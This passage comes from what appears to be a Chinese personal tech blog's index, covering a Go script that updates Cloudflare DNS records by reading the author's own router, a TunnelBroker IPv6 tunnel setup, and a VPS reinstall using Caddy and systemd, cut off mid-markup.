<code>PUT</code> <code>HEAD</code>。代码中我受Go语言本身的影响，一个地方把<code>GET</code>写成了<code>Get</code>（Go的命名方式一般为可外调函数的首字母大写），CF请求总是返回<code>400</code>，错误排查了我半个小时…</li>\n<li>获取本机IPv4的方式为模拟登录路由器管理页面获取内容，获取本机IPv6的方式为调用Go语言net库提取地址。</li>\n<li>实验室路由器<code>产品型号：TL-WDR7660千兆版</code>，登陆未使用<code>cookie</code>机制，而是在模拟登录后返回一个<code>stok</code>，后续可通过在url中加入这个参数获取内容。且获取路由器工作信息的方式为向<a href=\"http://192.168.1.1/stok=XXX/ds\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/stok=XXX/ds</a> <code>POST</code>一个body为<code>{&quot;network&quot;:{&quot;name&quot;:[&quot;wan_status&quot;]},&quot;method&quot;:&quot;get&quot;}</code>的数据，返回信息为<code>json</code>格式的结果。</li>\n</ol>\n<h1 id=\"代码部分\"><a href=\"#代码部分\" class=\"headerlink\" title=\"代码部分\"></a>代码部分</h1><p>因代码主要功能为自用，就不单独上传Github仓库了</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">\"bytes\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"encoding/json\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"io/ioutil\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"log\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"net\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"net/http\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"net/http/cookiejar\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"regexp\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"strings\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">\"github.com/tidwall/gjson\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> (</span><br><span class=\"line\">\tZONE_IDENTIFIER = <span class=\"string\">\"XXX\"</span></span><br><span class=\"line\">\tXAuthEmail      = <span class=\"string\">\"XXX\"</span></span><br><span class=\"line\">\tXAuthKey        = <span class=\"string\">\"XXX\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 初始化http请求的client端以复用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">initiateHttpClient</span><span class=\"params\">()</span> *<span class=\"title\">http</span>.<span class=\"title\">Client</span></span> &#123;</span><br><span class=\"line\">\tclient := &amp;http.Client&#123;&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> client</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过HTTP的GET请求获取identifier和ip</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">getIdentifierAndIp</span><span class=\"params\">(name <span class=\"keyword\">string</span>, dnsType <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(identifier <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, err error)</span></span> &#123;</span><br><span class=\"line\">\tdnsRecordsListUrl := fmt.Sprintf(<span class=\"string\">\"https://api.cloudflare.com/client/v4/zones/%s/dns_records?name=%s.littleghost.ml&amp;type=%s\"</span>, ZONE_IDENTIFIER, name, dnsType)</span><br><span class=\"line\">\trequest, err := http.NewRequest(<span class=\"string\">\"GET\"</span>, dnsRecordsListUrl, <span class=\"literal\">nil</span>) <span class=\"comment\">// 写的时候GET写成了Get，导致网页返回400，排除错误用了我半个小时...</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, <span class=\"string\">\"\"</span>, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"X-Auth-Email\"</span>, XAuthEmail)</span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"X-Auth-Key\"</span>, XAuthKey)</span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"Content-Type\"</span>, <span class=\"string\">\"application/json\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tresponse, err := httpClient.Do(request)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, <span class=\"string\">\"\"</span>, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> response.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tbody, err := ioutil.ReadAll(response.Body)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, <span class=\"string\">\"\"</span>, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tresult := gjson.Get(<span class=\"keyword\">string</span>(body), <span class=\"string\">\"result\"</span>).Array()[<span class=\"number\">0</span>].String() <span class=\"comment\">// 结果是gjson.Result</span></span><br><span class=\"line\">\tid := gjson.Get(result, <span class=\"string\">\"id\"</span>).String()</span><br><span class=\"line\">\tip = gjson.Get(result, <span class=\"string\">\"content\"</span>).String()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> id, ip, <span class=\"literal\">nil</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获取本机的IPv4和IPv6地址</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">getNativeIp</span><span class=\"params\">(ipType <span class=\"keyword\">string</span>)</span> <span class=\"params\">(ip <span class=\"keyword\">string</span>, err error)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ipType == <span class=\"string\">\"ipv4\"</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tjar, _ := cookiejar.New(<span class=\"literal\">nil</span>)</span><br><span class=\"line\">\t\thttpClient := &amp;http.Client&#123;</span><br><span class=\"line\">\t\t\tJar: jar,</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tloginUrl := <span class=\"string\">\"http://192.168.1.1/\"</span></span><br><span class=\"line\">\t\treq, _ := http.NewRequest(<span class=\"string\">\"POST\"</span>, loginUrl, strings.NewReader(<span class=\"string\">`&#123;\"method\":\"do\",\"login\":&#123;\"password\":\"XXX\"&#125;&#125;`</span>))</span><br><span class=\"line\">\t\tres, httpError := httpClient.Do(req)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> httpError != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tlog.Print(httpError)</span><br><span class=\"line\">\t\t\terr = httpError</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">defer</span> res.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tbody, _ := ioutil.ReadAll(res.Body)</span><br><span class=\"line\">\t\tstok := gjson.Get(<span class=\"keyword\">string</span>(body), <span class=\"string\">\"stok\"</span>).String()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tcontentUrl := fmt.Sprintf(<span class=\"string\">\"http://192.168.1.1/stok=%s/ds\"</span>, stok)</span><br><span class=\"line\">\t\treq, _ = http.NewRequest(<span class=\"string\">\"POST\"</span>, contentUrl, strings.NewReader(<span class=\"string\">`&#123;\"network\":&#123;\"name\":[\"wan_status\"]&#125;,\"method\":\"get\"&#125;`</span>))</span><br><span class=\"line\">\t\tres, httpError = httpClient.Do(req)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> httpError != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tlog.Print(httpError)</span><br><span class=\"line\">\t\t\terr = httpError</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">defer</span> res.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tbody, _ = ioutil.ReadAll(res.Body)</span><br><span class=\"line\">\t\tip = gjson.Get(<span class=\"keyword\">string</span>(body), <span class=\"string\">\"network\"</span>).Get(<span class=\"string\">\"wan_status\"</span>).Get(<span class=\"string\">\"ipaddr\"</span>).String()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> ip, <span class=\"literal\">nil</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ipType == <span class=\"string\">\"ipv6\"</span> &#123;</span><br><span class=\"line\">\t\taddrs, err := net.InterfaceAddrs()</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, err</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> _, address := <span class=\"keyword\">range</span> addrs &#123;</span><br><span class=\"line\">\t\t\tipnet, ok := address.(*net.IPNet)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> ok &amp;&amp; !ipnet.IP.IsLoopback() &#123;</span><br><span class=\"line\">\t\t\t\tip = ipnet.IP.String()</span><br><span class=\"line\">\t\t\t\tmatchFlag, err := regexp.MatchString(<span class=\"string\">\"2001\"</span>, ip)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, err</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> ip != <span class=\"string\">\"\"</span> &amp;&amp; matchFlag &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ip, <span class=\"literal\">nil</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检查ip是否需要更新</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">checkIp</span><span class=\"params\">(identifier <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, ipType <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(nativeIp <span class=\"keyword\">string</span>, updateFlag <span class=\"keyword\">bool</span>)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ipType == <span class=\"string\">\"ipv4\"</span> &#123;</span><br><span class=\"line\">\t\tnativeIpv4, err := getNativeIp(<span class=\"string\">\"ipv4\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\tupdateFlag = <span class=\"literal\">false</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ip != nativeIpv4 &#123;</span><br><span class=\"line\">\t\t\tnativeIp = nativeIpv4</span><br><span class=\"line\">\t\t\tupdateFlag = <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ipType == <span class=\"string\">\"ipv6\"</span> &#123;</span><br><span class=\"line\">\t\tnativeIpv6, err := getNativeIp(<span class=\"string\">\"ipv6\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\tupdateFlag = <span class=\"literal\">false</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ip != nativeIpv6 &#123;</span><br><span class=\"line\">\t\t\tnativeIp = nativeIpv6</span><br><span class=\"line\">\t\t\tupdateFlag = <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过HTTP的PUT请求更新ip</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">updateCloudflareDns</span><span class=\"params\">(identifier <span class=\"keyword\">string</span>, name <span class=\"keyword\">string</span>, dnsType <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(err error)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">type</span> updateDnsPostForm <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\t\tName    <span class=\"keyword\">string</span> <span class=\"string\">`json:\"name\"`</span></span><br><span class=\"line\">\t\tDnsType <span class=\"keyword\">string</span> <span class=\"string\">`json:\"type\"`</span></span><br><span class=\"line\">\t\tContent <span class=\"keyword\">string</span> <span class=\"string\">`json:\"content\"`</span></span><br><span class=\"line\">\t\tTtl     <span class=\"keyword\">int</span>    <span class=\"string\">`json:\"ttl\"`</span></span><br><span class=\"line\">\t\tProxied <span class=\"keyword\">bool</span>   <span class=\"string\">`json:\"proxied\"`</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tupdateDnsUrl := fmt.Sprintf(<span class=\"string\">\"https://api.cloudflare.com/client/v4/zones/%s/dns_records/%s\"</span>, ZONE_IDENTIFIER, identifier)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpostForm := updateDnsPostForm&#123;</span><br><span class=\"line\">\t\tName:    name,</span><br><span class=\"line\">\t\tDnsType: dnsType,</span><br><span class=\"line\">\t\tContent: ip,</span><br><span class=\"line\">\t\tTtl:     <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\tProxied: <span class=\"literal\">false</span>,</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpostBody, err := json.Marshal(postForm)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\trequest, err := http.NewRequest(<span class=\"string\">\"PUT\"</span>, updateDnsUrl, bytes.NewBuffer(postBody))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"X-Auth-Email\"</span>, XAuthEmail)</span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"X-Auth-Key\"</span>, XAuthKey)</span><br><span class=\"line\">\trequest.Header.Add(<span class=\"string\">\"Content-Type\"</span>, <span class=\"string\">\"application/json\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tresponse, err := httpClient.Do(request)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">defer</span> response.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tbody, err := ioutil.ReadAll(response.Body)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tlog.Print(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(<span class=\"keyword\">string</span>(body))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 程序入口</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\thttpClient := initiateHttpClient()</span><br><span class=\"line\">\tidentifier, ip, err := getIdentifierAndIp(<span class=\"string\">\"lab6\"</span>, <span class=\"string\">\"AAAA\"</span>, httpClient)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"Can't get identifier\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tnativeIp, updateFlag := checkIp(identifier, ip, <span class=\"string\">\"ipv6\"</span>, httpClient)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> updateFlag &#123;</span><br><span class=\"line\">\t\tupdateCloudflareDns(identifier, <span class=\"string\">\"lab6\"</span>, <span class=\"string\">\"AAAA\"</span>, nativeIp, httpClient)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tidentifier, ip, err = getIdentifierAndIp(<span class=\"string\">\"lab\"</span>, <span class=\"string\">\"A\"</span>, httpClient)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(<span class=\"string\">\"Can't get identifier\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tnativeIp, updateFlag = checkIp(identifier, ip, <span class=\"string\">\"ipv4\"</span>, httpClient)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> updateFlag &#123;</span><br><span class=\"line\">\t\tupdateCloudflareDns(identifier, <span class=\"string\">\"lab\"</span>, <span class=\"string\">\"A\"</span>, nativeIp, httpClient)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["dns","golang","爬虫"]},{"title":"使用TunnelBroker为bandwagon配置6in4","url":"https://littleghost2016.github.io/2019/12/01/使用TunnelBroker为bandwagon配置6in4/","content":"<p>VPS套餐只提供ipv4地址，无ipv6，使用<code>TunnelBroker</code>搭建6in4隧道，获取可使用的ipv6地址。</p>\n<h1 id=\"注册配置TunnelBroker\"><a href=\"#注册配置TunnelBroker\" class=\"headerlink\" title=\"注册配置TunnelBroker\"></a>注册配置TunnelBroker</h1><h2 id=\"注册\"><a href=\"#注册\" class=\"headerlink\" title=\"注册\"></a>注册</h2><p><a href=\"https://www.tunnelbroker.net/register.php\" target=\"_blank\" rel=\"noopener\">注册网址</a>，除了<code>username</code> <code>password</code> <code>email</code> 其他我是随便写的，包括<code>phone</code>，并没有做审核信息审查。</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><ol>\n<li><p>点击左侧<a href=\"https://www.tunnelbroker.net/new_tunnel.php\" target=\"_blank\" rel=\"noopener\">Create Regular Tunnel</a></p>\n<p><img src=\"CreateRegularTunnel.png\" alt=\"CreateRegularTunnel\"></p>\n</li>\n<li><p>上方输入VPS的公网ipv4地址，下方选择隧道接入点，默认是洛杉矶。<img src=\"CreateNewTunnel.png\" alt=\"CreateNewTunnel\"></p>\n</li>\n<li><p>在<code>ipv6 tunnel</code>页面可查看自己的信息，包括ipv4、ipv6地址。<img src=\"IPV6Tunnel.png\" alt=\"IPV6Tunnel\"></p>\n</li>\n<li><p>在<code>Example Configurations</code>页面选择自己VPS的操作系统，下面回给出后续操作模板。我的是Ubuntu系统，所以根据提示应该修改网络配置文件。<img src=\"ExampleConfigurations.png\" alt=\"Example Configurations\"></p>\n</li>\n</ol>\n<h1 id=\"VPS配置\"><a href=\"#VPS配置\" class=\"headerlink\" title=\"VPS配置\"></a>VPS配置</h1><ol>\n<li><p>修改文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在下面添加<code>Example Configurations</code>页面的内容，直接复制粘贴即可。<img src=\"etc_network_interfaces.png\" alt=\"/etc/network/interfaces\"></p>\n</li>\n<li><p>重启网络服务（可能会有些慢，我等待了大概10-15秒）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl restart networking.service</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看ip显示已有ipv6地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ip a</span><br></pre></td></tr></table></figure>\n\n<p>其中蓝色箭头指示已有的ipv4地址，红色箭头指示新的ipv6地址<img src=\"ip_a.png\" alt=\"ip a\"></p>\n</li>\n<li><p>可以使用<code>ping</code>命令检测是否已可以使用ipv6网络<img src=\"ping6_google.com.png\" alt=\"ping6 google.com\"></p>\n<p>速度还挺快的！</p>\n</li>\n</ol>\n","categories":["技术"],"tags":["ipv6","6in4","TunnelBroker","linux"]},{"title":"重装vps","url":"https://littleghost2016.github.io/2019/11/13/重装vps/","content":"<h1 id=\"总体工作\"><a href=\"#总体工作\" class=\"headerlink\" title=\"总体工作\"></a>总体工作</h1><h2 id=\"工作列表\"><a href=\"#工作列表\" class=\"headerlink\" title=\"工作列表\"></a>工作列表</h2><ul>\n<li><input checked disabled type=\"checkbox\"> 重装系统ubuntu18.04</li>\n<li><input checked disabled type=\"checkbox\"> 旧域名更换为新域名<a href=\"www.littleghost.ml\">littleghost.ml</a></li>\n<li><input checked disabled type=\"checkbox\"> Web服务器由<code>Nginx</code>切换为<code>Caddy</code><ul>\n<li>实际使用的caddy为<code>caddy2Beta20</code>版本（当前最新），启动命令和caddyfile与1.X版本有不小的差别。</li>\n</ul>\n</li>\n<li><input checked disabled type=\"checkbox\"> 部署<code>V2ray</code>服务<ul>\n<li>模式为WebSocket + TLS，并未使用CDN。</li>\n</ul>\n</li>\n<li><input checked disabled type=\"checkbox\"> <code>caddy</code>和<code>v2ray</code>均使用<code>systemd</code>做进程守护。</li>\n<li><input checked disabled type=\"checkbox\"> 通知小伙伴们重装期间无法提供服务，且原域名基本不再使用。</li>\n<li><input disabled type=\"checkbox\"> 编写自动安装和升级caddy和v2ray的脚本。</li>\n</ul>\n<h2 id=\"整体文件布局\"><a href=\"#整体文件布局\" class=\"headerlink\" title=\"整体文件布局\"></a>整体文件布局</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">/etc/systemd/system</span><br><span class=\"line\">├── caddy.service</span><br><span class=\"line\">└── v2ray.service</span><br><span class=\"line\"></span><br><span class=\"line\">/home/ubuntu/program</span><br><span class=\"line\">├── caddy</span><br><span class=\"line\">│   ├── bin</span><br><span class=\"line\">│   │   ├── caddy</span><br><span class=\"line\">│   ├── config</span><br><span class=\"line\">│   │   └── caddyfile</span><br><span class=\"line\">│   └── ssl</span><br><span class=\"line\">│       ├── acme</span><br><span class=\"line\">│       ├── locks</span><br><span class=\"line\">│       └── ocsp</span><br><span class=\"line\">└── v2ray</span><br><span class=\"line\">    ├── bin</span><br><span class=\"line\">    │   ├── v2ctl</span><br><span class=\"line\">    │   ├── v2ray</span><br><span class=\"line\">    ├── config</span><br><span class=\"line\">    │   ├── v2ray.service</span><br><span class=\"line\">    │   └── config.json</span><br><span class=\"line\">    └── log</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"caddy\"><a href=\"#caddy\" class=\"headerlink\" title=\"caddy\"></a>caddy</h1><h2 id=\"文件布局\"><a href=\"#文件布局\" class=\"headerlink\" title=\"文件布局\"></a>文件布局</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree caddy -L 2</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">caddy</span><br><span class=\"line\">├── bin</span><br><span class=\"line\">│   ├── caddy</span><br><span class=\"line\">├── config</span><br><span class=\"line\">│   └── caddyfile</span><br><span class=\"line\">└── ssl</span><br><span class=\"line\">    ├── acme</span><br><span class=\"line\">    ├── locks</span><br><span class=\"line\">    └── ocsp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><ol>\n<li>caddy包含1.X和2.0 beta 20两个版本的二进制执行文件和配置文件，两种版本都能够实现所需功能。</li>\n<li>1.0和2.0版本的配置文件和启动命令都不同。</li>\n<li>域名映射<ul>\n<li><code>www.littleghost.cn</code> –301–&gt; <code>littleghost2016.github.io</code></li>\n<li><code>blog.littleghost.ml</code> &amp; <code>www.littleghost.ml</code> 反向代理<code>littleghost2016.github.io</code></li>\n<li><code>blog.littleghost.ml/game</code> -&gt; 反向代理</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"caddy-2-0-beta20-版本\"><a href=\"#caddy-2-0-beta20-版本\" class=\"headerlink\" title=\"caddy 2.0 beta20 版本\"></a>caddy 2.0 beta20 版本</h2><p>推荐使用caddy的新版本。</p>\n<h3 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim ~/program/caddy/config/caddyfile</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">blog.littleghost.ml/game &#123;</span><br><span class=\"line\">    encode gzip zstd</span><br><span class=\"line\">    reverse_proxy localhost:your_port</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">blog.littleghost.ml, www.littleghost.ml &#123;</span><br><span class=\"line\">    tls 785340571@qq.com</span><br><span class=\"line\">    encode gzip zstd</span><br><span class=\"line\">    reverse_proxy &#123;</span><br><span class=\"line\">        to littleghost2016.github.io:443</span><br><span class=\"line\">        header_up Host &#123;http.reverse_proxy.upstream.host&#125;</span><br><span class=\"line\">        transport http &#123;</span><br><span class=\"line\">            tls</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">www.littleghost.cn &#123;</span><br><span class=\"line\">    tls 785340571@qq.com</span><br><span class=\"line\">    encode gzip zstd</span><br><span class=\"line\">    redir / https://littleghost2016.github.io</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中代理Github Pages部分参考了<a href=\"https://caddy.community/t/simple-reverse-proxy-config-for-v2/6711\" target=\"_blank\" rel=\"noopener\">Simple Reverse-Proxy Config for V2</a></p>\n<h3 id=\"systemd进程守护配置\"><a href=\"#systemd进程守护配置\" class=\"headerlink\" title=\"systemd进程守护配置\"></a>systemd进程守护配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/systemd/system/caddy.service</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Caddy Server</span><br><span class=\"line\">After=syslog.target</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=root</span><br><span class=\"line\">Group=root</span><br><span class=\"line\">LimitNOFILE=64000</span><br><span class=\"line\">Environment=CADDYPATH=/home/ubuntu/program/caddy/ssl</span><br><span class=\"line\">ReadWriteDirectories=/home/ubuntu/program/caddy/ssl</span><br><span class=\"line\">ExecStart=/home/ubuntu/program/caddy/bin/caddy run --config /home/ubuntu/program/caddy/config/caddyfile --adapter caddyfile</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>说明：</p>\n<ol>\n<li>使用非root用户不能绑定80和443端口，会提醒<code>permission denied!</code></li>\n<li>caddy的启动命令使用<code>run</code>，指定配置文件时使用<code>--config</code>，当caddy的配置文件格式与上述示例相同时，应该使用<code>--adapter caddyfile</code>。</li>\n<li>注意两个地方，否则SSL证书无法正常被caddy请求、下载和使用。<ul>\n<li>caddy的配置文件中域名不要写错</li>\n<li>DNS解析要解析到自己的服务器上</li>\n</ul>\n</li>\n</ol>\n<h1 